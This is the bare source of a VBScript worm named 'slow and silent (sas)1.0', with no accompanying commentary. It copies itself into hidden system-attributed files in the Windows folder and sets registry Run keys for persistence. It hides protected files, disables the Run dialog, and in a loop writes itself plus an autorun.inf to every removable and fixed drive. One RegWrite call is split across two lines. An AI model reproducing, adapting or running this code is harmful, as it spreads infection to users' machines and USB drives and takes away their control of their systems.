'marker
'slow and silent (sas)1.0
on error resume next
dim mysource,winpath,flashdrive,fs,mf,atr,tf,rg,nt,cc,hm
atr = "[autorun]"&vbcrlf&"shellexecute=wscript.exe .MS32DLL.dll.vbs"
set fs = createobject("Scripting.FileSystemObject")
set mf = fs.getfile(Wscript.ScriptFullname)
set rg = createobject("WScript.Shell")
rg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout","1000"
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MS32DLL",winpath&"\.MS32DLL.dll.vbs"
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\winboot","wscript.exe "&winpath&"\boot.ini"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun",1,"REG_DWORD"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\SuperHidden",0,"REG_DWORD"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden",1,"REG_DWORD"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt","0"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden","0"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun","1"
dim text,size
size = mf.size
set text=mf.openastextstream(1,-2)
cc = text.readline
do while not text.atendofstream
mysource=mysource&text.readline
mysource=mysource & vbcrlf
loop
Set winpath = fs.getspecialfolder(0)
set tf = fs.getfile(winpath & "\.MS32DLL.dll.vbs")
tf.attributes = 32
set tf=fs.createtextfile(winpath & "\.MS32DLL.dll.vbs",2,true)
tf.write "'ker"&vbcrlf&mysource
tf.close
set tf = fs.getfile(winpath & "\.MS32DLL.dll.vbs")
tf.attributes = 39
Set winpath = fs.getspecialfolder(0)
set tf = fs.getfile(winpath & "\boot.ini")
tf.attributes = 32
set tf=fs.createtextfile(winpath & "\boot.ini",2,true)
tf.write "'ker"&vbcrlf&mysource
tf.close
set tf = fs.getfile(winpath & "\boot.ini")
tf.attributes = 39
if cc = "'mark" then
rg.run winpath&"\explorer.exe /e,/select, "&Wscript.ScriptFullname
end if
if cc = "'marker" then
rg.run winpath&"\explorer.exe /e,/select, "&Wscript.ScriptFullname
end if
do
for each flashdrive in fs.drives
hm="'mark"
If (flashdrive.drivetype=1 or flashdrive.drivetype=2) and flashdrive.path <> "A:" then
if(flashdrive.drivetype=2) then
hm = "'marker"
end if
set tf=fs.getfile(flashdrive.path &"\.MS32DLL.dll.vbs")
tf.attributes =32
set tf=fs.createtextfile(flashdrive.path &"\.MS32DLL.dll.vbs",2,false)
tf.write hm&vbcrlf&mysource
tf.close
set tf=fs.getfile(flashdrive.path &"\.MS32DLL.dll.vbs")
tf.attributes =39
set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes = 32
set tf=fs.createtextfile(flashdrive.path &"\autorun.inf",2,false)
tf.write atr
tf.close
set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes=39
end if
rg.R
egWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout","1000"
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MS32DLL",winpath&"\.MS32DLL.dll.vbs"
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\winboot","wscript.exe /E:vbs "&winpath&"\boot.ini"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun",1,"REG_DWORD"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\SuperHidden",0,"REG_DWORD"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden",0,"REG_DWORD"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt","0"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden","0"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun","1"
next
if cc <> "'mark" then
Wscript.sleep 10000
end if
loop while cc <> "'mark"
